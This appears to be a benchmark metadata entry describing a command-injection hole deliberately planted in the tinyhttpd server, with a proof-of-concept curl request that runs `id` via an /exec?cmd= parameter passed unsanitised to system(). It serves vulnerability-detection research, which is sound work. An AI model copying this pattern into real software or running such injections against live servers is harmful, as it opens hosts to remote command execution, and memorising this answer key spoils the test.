@@ -1,0 +1,53 @@
+PACKAGE:     tinyhttpd
+COMMIT:      fbd25cf755075d803cba09201a8f0dd6ac347c27
+SOURCE:      /home/ubuntu/anthropic/corpus/tinyhttpd/
+AXES:        C1b I3 S1
+
+DESCRIPTION:
+  CLI-flag-gated command injection. The server must be started with BOTH
+  --exec-mode and --exec-logging for the vulnerable endpoint to be reachable.
+  A user-supplied URL query parameter flows into system() with no sanitization.
+
+CONFIG_GATE (C2 — struct, two flags):
+  mechanism:  CLI flags (--exec-mode AND --exec-logging), stored in struct exec_config exec_cfg
+  check:      compound boolean guard inside accept_request()
+              `if (exec_cfg.enabled && exec_cfg.logging && strncmp(url, "/exec", 5) == 0 ...)`
+  complexity: two conditions, two flags, struct-based config, no file parsing
+
+INPUT_FLOW (I3 — struct dispatch):
+  entry:      HTTP GET /exec?cmd=<payload>  →  url[] (parsed in accept_request())
+  path:       accept_request() dispatches to handle_exec()
+              handle_exec() stores cmd in exec_args_t struct, calls dispatch_exec()
+              dispatch_exec() calls system(args->cmd)
+  transforms: one struct indirection — cmd pointer is stored then dereferenced; no transform
+
+SANITIZATION (S1 — none):
+  none
+
+SINK:        system() in dispatch_exec() — called via exec_args_t struct from handle_exec() (httpd.c, injected into accept_request / handle_exec)
+
+CHANGED FILES:
+  httpd.c — 4 hunks:
+    1. globals:          added `struct exec_config exec_cfg`
+    2. send_exec_reply(): new HTTP response helper function
+    3. handle_exec():    new function with I3/S1 variant logic
+    4. accept_request(): added exec route guard after url[] is read
+    5. main():           changed main(void) to main(int argc, char *argv[]) with --port/--exec-mode/--exec-logging parsing
+
+EXPLOIT:
+  build:   gcc -o httpd httpd.c -lpthread
+  start:   (cd /tmp/poc_016_www && ./httpd --port 18016 --exec-mode --exec-logging)
+  trigger: curl 'http://127.0.0.1:18016/exec?cmd=id>/tmp/poc_016_marker'
+  verify:  cat /tmp/poc_016_marker
+  expect:  uid=... line written by the server process
+
+  gate bypass: omitting either --exec-mode or --exec-logging (or both) causes /exec
+               to return 404 (the guard requires both exec_cfg.enabled and exec_cfg.logging).
+
+NOTES:
+
+  - system() output goes to the server's stdout/stderr (inherited fds), not the
+    HTTP response body. The response body contains only "Command dispatched.".
+    Use a write-to-file payload (id>/tmp/poc_016_marker) to confirm blind execution.
+  - I3 stores cmd in a struct then passes args->cmd to system(). The indirection
+    is cosmetic — no transform or sanitization occurs at the struct boundary.
